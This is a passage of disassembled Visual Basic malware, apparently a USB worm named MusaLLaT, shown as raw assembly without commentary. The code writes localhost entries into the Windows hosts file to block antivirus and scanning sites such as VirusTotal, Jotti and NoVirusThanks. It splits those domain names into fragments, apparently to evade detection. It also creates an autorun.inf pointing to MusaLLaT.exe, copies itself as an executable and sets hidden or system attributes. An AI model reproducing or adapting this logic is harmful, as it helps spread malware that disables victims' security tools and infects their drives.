  push 0041BCF8h ; "127.0.0.1  www.f-pr"
  push 0041BCE4h ; "ot.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A6h
  push 0041BBC8h ; "127.0.0.1  www.vir"
  push 0041BD24h ; "ust"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BD30h ; "otal.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000A7h
  push 00419DD4h ; "127.0.0.1  vir"
  push 0041BD24h ; "ust"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BD30h ; "otal.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000A8h
  push 0041BD48h ; "127.0.0.1  scanner.vir"
  push 0041BD24h ; "ust"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BD30h ; "otal.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000A9h
  push 00419DD4h ; "127.0.0.1  vir"
  push 0041BD7Ch ; "ussc"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BD8Ch ; "an.jo"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041BD9Ch ; "tti.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 000000AAh
  push 0041BDB0h ; "127.0.0.1  jotti.org"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 000000ABh
  push 0041BDE0h ; "127.0.0.1  novi"
  push 0041BE04h ; "rusth"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419D6Ch ; "anks.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000ACh
  push 0041BE14h ; "127.0.0.1  www.novi"
  push 0041BC74h ; "rustha"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041A8F0h ; "nks.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000ADh
  push 00419BC4h ; "127.0.0.1  sc"
  push 0041B908h ; "ann"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BE40h ; "er.no"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041BE50h ; "viru"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041BE60h ; "sthanks.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 000000AEh
  push 00000001h
  call [004010A0h]
  mov var_4, 000000AFh
  push 00000006h
  push 0041BE7Ch ; "C:\WINDOWS\system32\drivers\etc\hosts"
  call [004011D0h]
  mov var_4, 000000B0h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000324h]
  push eax
  lea eax, var_50
  push eax
  call [00401078h]
  mov var_64, eax
  push 00000000h
  mov ecx, var_64
  mov edx, [ecx]
  mov eax, var_64
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_68, eax
  cmp var_68, 00000000h
  jge 004485BEh
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_64
  push ecx
  mov edx, var_68
  push edx
  call [00401058h]
  mov var_80, eax
  jmp 004485C5h
  mov var_80, 00000000h
  lea ecx, var_50
  call [004011D4h]
  mov var_10, 00000000h
  push 0044861Eh
  jmp 0044861Dh
  lea eax, var_4C
  push eax
  lea ecx, var_48
  push ecx
  lea edx, var_44
  push edx
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 0000000Bh
  call [00401150h]
  add esp, 00000030h
  lea ecx, var_50
  call [004011D4h]
  ret
  ret
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer11_Timer() '444770
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 0000008Ch
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401600h ; Chr(37)
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000310h]
  push eax
  lea edx, var_34
  push edx
  call [00401078h]
  mov var_44, eax
  lea eax, var_3C
  push eax
  mov ecx, var_44
  mov edx, [ecx]
  mov eax, var_44
  push eax
  call [edx+000000E0h]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 0044483Ah
  push 000000E0h
  push 00418DC4h
  mov ecx, var_44
  push ecx
  mov edx, var_48
  push edx
  call [00401058h]
  mov var_74, eax
  jmp 00444841h
  mov var_74, 00000000h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000310h]
  push eax
  lea eax, var_38
  push eax
  call [00401078h]
  mov var_4C, eax
  lea ecx, var_40
  push ecx
  mov edx, var_4C
  mov eax, [edx]
  mov ecx, var_4C
  push ecx
  call [eax+000000D8h]
  fnclex
  mov var_50, eax
  cmp var_50, 00000000h
  jge 00444899h
  push 000000D8h
  push 00418DC4h
  mov edx, var_4C
  push edx
  mov eax, var_50
  push eax
  call [00401058h]
  mov var_78, eax
  jmp 004448A0h
  mov var_78, 00000000h
  mov cx, var_40
  sub cx, 0001h
  jo 00444F4Dh
  xor edx, edx
  cmp var_3C, cx
  setz dl
  neg edx
  mov var_54, dx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  movsx edx, var_54
  test edx, edx
  jz 00444B31h
  mov var_4, 00000004h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000310h]
  push eax
  lea eax, var_34
  push eax
  call [00401078h]
  mov var_44, eax
  lea ecx, var_24
  push ecx
  mov edx, var_44
  mov eax, [edx]
  mov ecx, var_44
  push ecx
  call [eax+000000F8h]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 0044493Bh
  push 000000F8h
  push 00418DC4h
  mov edx, var_44
  push edx
  mov eax, var_48
  push eax
  call [00401058h]
  mov var_7C, eax
  jmp 00444942h
  mov var_7C, 00000000h
  mov edx, 00419858h ; "*.*"
  lea ecx, var_30
  call [00401148h]
  mov edx, 00418DACh ; "*"
  lea ecx, var_2C
  call [00401148h]
  mov ecx, var_24
  mov var_6C, ecx
  mov var_24, 00000000h
  mov edx, var_6C
  lea ecx, var_28
  call [004011ACh]
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+000006F8h]
  mov var_4C, eax
  cmp var_4C, 00000000h
  jge 004449B8h
  push 000006F8h
  push 00418934h
  mov edx, Me
  push edx
  mov eax, var_4C
  push eax
  call [00401058h]
  mov var_80, eax
  jmp 004449BFh
  mov var_80, 00000000h
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  lea ecx, var_34
  call [004011D4h]
  mov var_4, 00000005h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000310h]
  push eax
  lea ecx, var_34
  push ecx
  call [00401078h]
  mov var_44, eax
  push 00000000h
  mov edx, var_44
  mov eax, [edx]
  mov ecx, var_44
  push ecx
  call [eax+000000E4h]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444A3Fh
  push 000000E4h
  push 00418DC4h
  mov edx, var_44
  push edx
  mov eax, var_48
  push eax
  call [00401058h]
  mov var_84, eax
  jmp 00444A49h
  mov var_84, 00000000h
  lea ecx, var_34
  call [004011D4h]
  mov var_4, 00000006h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000308h]
  push eax
  lea ecx, var_34
  push ecx
  call [00401078h]
  mov var_44, eax
  push FFFFFFFFh
  mov edx, var_44
  mov eax, [edx]
  mov ecx, var_44
  push ecx
  call [eax+0000005Ch]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444AACh
  push 0000005Ch
  push 0041925Ch
  mov edx, var_44
  push edx
  mov eax, var_48
  push eax
  call [00401058h]
  mov var_88, eax
  jmp 00444AB6h
  mov var_88, 00000000h
  lea ecx, var_34
  call [004011D4h]
  mov var_4, 00000007h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000304h]
  push eax
  lea ecx, var_34
  push ecx
  call [00401078h]
  mov var_44, eax
  push 00000000h
  mov edx, var_44
  mov eax, [edx]
  mov ecx, var_44
  push ecx
  call [eax+0000005Ch]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444B19h
  push 0000005Ch
  push 0041925Ch
  mov edx, var_44
  push edx
  mov eax, var_48
  push eax
  call [00401058h]
  mov var_8C, eax
  jmp 00444B23h
  mov var_8C, 00000000h
  lea ecx, var_34
  call [004011D4h]
  jmp 00444EEDh
  mov var_4, 00000009h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+0000030Ch]
  push eax
  lea ecx, var_34
  push ecx
  call [00401078h]
  mov var_44, eax
  mov edx, var_44
  mov eax, [edx]
  mov ecx, var_44
  push ecx
  call [eax+000001E8h]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444B8Fh
  push 000001E8h
  push 00418DC4h
  mov edx, var_44
  push edx
  mov eax, var_48
  push eax
  call [00401058h]
  mov var_90, eax
  jmp 00444B99h
  mov var_90, 00000000h
  lea ecx, var_34
  call [004011D4h]
  mov var_4, 0000000Ah
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000310h]
  push eax
  lea ecx, var_38
  push ecx
  call [00401078h]
  mov var_4C, eax
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000310h]
  push eax
  lea edx, var_34
  push edx
  call [00401078h]
  mov var_44, eax
  lea eax, var_3C
  push eax
  mov ecx, var_44
  mov edx, [ecx]
  mov eax, var_44
  push eax
  call [edx+000000E0h]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444C21h
  push 000000E0h
  push 00418DC4h
  mov ecx, var_44
  push ecx
  mov edx, var_48
  push edx
  call [00401058h]
  mov var_94, eax
  jmp 00444C2Bh
  mov var_94, 00000000h
  mov ax, var_3C
  add ax, 0001h
  jo 00444F4Dh
  push eax
  mov ecx, var_4C
  mov edx, [ecx]
  mov eax, var_4C
  push eax
  call [edx+000000E4h]
  fnclex
  mov var_50, eax
  cmp var_50, 00000000h
  jge 00444C74h
  push 000000E4h
  push 00418DC4h
  mov ecx, var_4C
  push ecx
  mov edx, var_50
  push edx
  call [00401058h]
  mov var_98, eax
  jmp 00444C7Eh
  mov var_98, 00000000h
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 0000000Bh
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000310h]
  push eax
  lea edx, var_34
  push edx
  call [00401078h]
  mov var_44, eax
  lea eax, var_24
  push eax
  mov ecx, var_44
  mov edx, [ecx]
  mov eax, var_44
  push eax
  call [edx+000000F8h]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444CF3h
  push 000000F8h
  push 00418DC4h
  mov ecx, var_44
  push ecx
  mov edx, var_48
  push edx
  call [00401058h]
  mov var_9C, eax
  jmp 00444CFDh
  mov var_9C, 00000000h
  mov edx, 00419858h ; "*.*"
  lea ecx, var_30
  call [00401148h]
  mov edx, 00418DACh ; "*"
  lea ecx, var_2C
  call [00401148h]
  mov eax, var_24
  mov var_70, eax
  mov var_24, 00000000h
  mov edx, var_70
  lea ecx, var_28
  call [004011ACh]
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+000006F8h]
  mov var_4C, eax
  cmp var_4C, 00000000h
  jge 00444D76h
  push 000006F8h
  push 00418934h
  mov ecx, Me
  push ecx
  mov edx, var_4C
  push edx
  call [00401058h]
  mov var_A0, eax
  jmp 00444D80h
  mov var_A0, 00000000h
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  lea ecx, var_34
  call [004011D4h]
  mov var_4, 0000000Ch
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+0000030Ch]
  push eax
  lea eax, var_34
  push eax
  call [00401078h]
  mov var_44, eax
  push 00000000h
  mov ecx, var_44
  mov edx, [ecx]
  mov eax, var_44
  push eax
  call [edx+000000E4h]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444E00h
  push 000000E4h
  push 00418DC4h
  mov ecx, var_44
  push ecx
  mov edx, var_48
  push edx
  call [00401058h]
  mov var_A4, eax
  jmp 00444E0Ah
  mov var_A4, 00000000h
  lea ecx, var_34
  call [004011D4h]
  mov var_4, 0000000Dh
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000308h]
  push eax
  lea eax, var_34
  push eax
  call [00401078h]
  mov var_44, eax
  push FFFFFFFFh
  mov ecx, var_44
  mov edx, [ecx]
  mov eax, var_44
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444E6Dh
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_44
  push ecx
  mov edx, var_48
  push edx
  call [00401058h]
  mov var_A8, eax
  jmp 00444E77h
  mov var_A8, 00000000h
  lea ecx, var_34
  call [004011D4h]
  mov var_4, 0000000Eh
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000304h]
  push eax
  lea eax, var_34
  push eax
  call [00401078h]
  mov var_44, eax
  push 00000000h
  mov ecx, var_44
  mov edx, [ecx]
  mov eax, var_44
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_48, eax
  cmp var_48, 00000000h
  jge 00444EDAh
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_44
  push ecx
  mov edx, var_48
  push edx
  call [00401058h]
  mov var_AC, eax
  jmp 00444EE4h
  mov var_AC, 00000000h
  lea ecx, var_34
  call [004011D4h]
  mov var_10, 00000000h
  push 00444F2Bh
  jmp 00444F2Ah
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  ret
  ret
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer6_Timer() '449850
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 000000FCh
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401A38h ; "'"
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  lea edx, var_60
  push edx
  call [00401178h]
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000334h]
  push eax
  lea eax, var_4C
  push eax
  call [00401078h]
  mov var_C4, eax
  lea ecx, var_34
  push ecx
  mov edx, var_C4
  mov eax, [edx]
  mov ecx, var_C4
  push ecx
  call [eax+000000A0h]
  fnclex
  mov var_C8, eax
  cmp var_C8, 00000000h
  jge 0044993Ch
  push 000000A0h
  push 00418EA4h
  mov edx, var_C4
  push edx
  mov eax, var_C8
  push eax
  call [00401058h]
  mov var_FC, eax
  jmp 00449946h
  mov var_FC, 00000000h
  mov ecx, var_34
  mov var_F8, ecx
  mov var_34, 00000000h
  mov edx, var_F8
  mov var_78, edx
  mov var_80, 00008008h
  push 00000002h
  lea eax, var_60
  push eax
  lea ecx, var_70
  push ecx
  call [004011A4h]
  lea edx, var_80
  push edx
  lea eax, var_70
  push eax
  call [004010B8h]
  mov var_CC, ax
  lea ecx, var_4C
  call [004011D4h]
  lea ecx, var_70
  push ecx
  lea edx, var_80
  push edx
  lea eax, var_60
  push eax
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  movsx ecx, var_CC
  test ecx, ecx
  jz 0044A0C8h
  mov var_4, 00000004h
  mov var_98, 0041C1B0h
  mov var_A0, 00000008h
  lea edx, var_A0
  lea ecx, var_60
  call [0040118Ch]
  push 00000000h
  lea edx, var_60
  push edx
  call [00401120h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_B8, ax
  mov var_C0, 0000000Bh
  mov var_A8, 00000000h
  mov var_B0, 0000800Bh
  lea eax, var_C0
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_70
  push eax
  call [00401174h]
  push eax
  lea ecx, var_80
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_C4, ax
  lea ecx, var_34
  call [004011CCh]
  lea edx, var_C0
  push edx
  lea eax, var_60
  push eax
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx ecx, var_C4
  test ecx, ecx
  jz 00449FC4h
  mov var_4, 00000005h
  cmp [00460558h], 00000000h
  jnz 00449AC3h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_100, 00460558h
  jmp 00449ACDh
  mov var_100, 00460558h
  mov edx, var_100
  mov eax, [edx]
  mov var_C4, eax
  lea ecx, var_4C
  push ecx
  mov edx, var_C4
  mov eax, [edx]
  mov ecx, var_C4
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_C8, eax
  cmp var_C8, 00000000h
  jge 00449B25h
  push 00000014h
  push 00418ED0h
  mov edx, var_C4
  push edx
  mov eax, var_C8
  push eax
  call [00401058h]
  mov var_104, eax
  jmp 00449B2Fh
  mov var_104, 00000000h
  mov ecx, var_4C
  mov var_CC, ecx
  lea edx, var_34
  push edx
  mov eax, var_CC
  mov ecx, [eax]
  mov edx, var_CC
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_D0, eax
  cmp var_D0, 00000000h
  jge 00449B82h
  push 00000050h
  push 00418EF0h
  mov eax, var_CC
  push eax
  mov ecx, var_D0
  push ecx
  call [00401058h]
  mov var_108, eax
  jmp 00449B8Ch
  mov var_108, 00000000h
  cmp [00460558h], 00000000h
  jnz 00449BB1h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_10C, 00460558h
  jmp 00449BBBh
  mov var_10C, 00460558h
  mov edx, var_10C
  mov eax, [edx]
  mov var_D4, eax
  lea ecx, var_50
  push ecx
  mov edx, var_D4
  mov eax, [edx]
  mov ecx, var_D4
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_D8, eax
  cmp var_D8, 00000000h
  jge 00449C13h
  push 00000014h
  push 00418ED0h
  mov edx, var_D4
  push edx
  mov eax, var_D8
  push eax
  call [00401058h]
  mov var_110, eax
  jmp 00449C1Dh
  mov var_110, 00000000h
  mov ecx, var_50
  mov var_DC, ecx
  lea edx, var_38
  push edx
  mov eax, var_DC
  mov ecx, [eax]
  mov edx, var_DC
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_E0, eax
  cmp var_E0, 00000000h
  jge 00449C70h
  push 00000058h
  push 00418EF0h
  mov eax, var_DC
  push eax
  mov ecx, var_E0
  push ecx
  call [00401058h]
  mov var_114, eax
  jmp 00449C7Ah
  mov var_114, 00000000h
  push 0041C18Ch
  mov edx, var_34
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  mov eax, var_38
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_34
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea eax, var_50
  push eax
  lea ecx, var_4C
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000006h
  push 0041C17Ch
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  lea edx, var_48
  push edx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea eax, var_48
  push eax
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 00000007h
  push 0041C17Ch
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea eax, var_44
  push eax
  lea ecx, var_40
  push ecx
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000008h
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000009h
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000000Ah
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000000Bh
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000000Ch
  push 00000001h
  call [004010A0h]
  mov var_4, 0000000Dh
  push 00000006h
  push 0041C18Ch
  call [004011D0h]
  mov var_4, 0000000Eh
  push 00000006h
  push 0041C17Ch
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  call [004011D0h]
  lea edx, var_44
  push edx
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000000Fh
  mov var_98, FFFFFFFFh
  mov var_A0, 0000000Bh
  lea edx, var_A0
  lea ecx, var_30
  call [00401010h]
  mov var_4, 00000011h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000328h]
  push eax
  lea ecx, var_4C
  push ecx
  call [00401078h]
  mov var_C4, eax
  push FFFFFFFFh
  mov edx, var_C4
  mov eax, [edx]
  mov ecx, var_C4
  push ecx
  call [eax+0000005Ch]
  fnclex
  mov var_C8, eax
  cmp var_C8, 00000000h
  jge 0044A033h
  push 0000005Ch
  push 0041925Ch
  mov edx, var_C4
  push edx
  mov eax, var_C8
  push eax
  call [00401058h]
  mov var_118, eax
  jmp 0044A03Dh
  mov var_118, 00000000h
  lea ecx, var_4C
  call [004011D4h]
  mov var_4, 00000012h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+0000033Ch]
  push eax
  lea ecx, var_4C
  push ecx
  call [00401078h]
  mov var_C4, eax
  push 00000000h
  mov edx, var_C4
  mov eax, [edx]
  mov ecx, var_C4
  push ecx
  call [eax+0000005Ch]
  fnclex
  mov var_C8, eax
  cmp var_C8, 00000000h
  jge 0044A0B5h
  push 0000005Ch
  push 0041925Ch
  mov edx, var_C4
  push edx
  mov eax, var_C8
  push eax
  call [00401058h]
  mov var_11C, eax
  jmp 0044A0BFh
  mov var_11C, 00000000h
  lea ecx, var_4C
  call [004011D4h]
  mov var_10, 00000000h
  push 0044A135h
  jmp 0044A12Bh
  lea ecx, var_48
  push ecx
  lea edx, var_44
  push edx
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  lea ecx, var_50
  push ecx
  lea edx, var_4C
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea eax, var_90
  push eax
  lea ecx, var_80
  push ecx
  lea edx, var_70
  push edx
  lea eax, var_60
  push eax
  push 00000004h
  call [00401024h]
  add esp, 00000014h
  ret
  lea ecx, var_30
  call [00401014h]
  ret
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000008h]
  mov eax, var_10
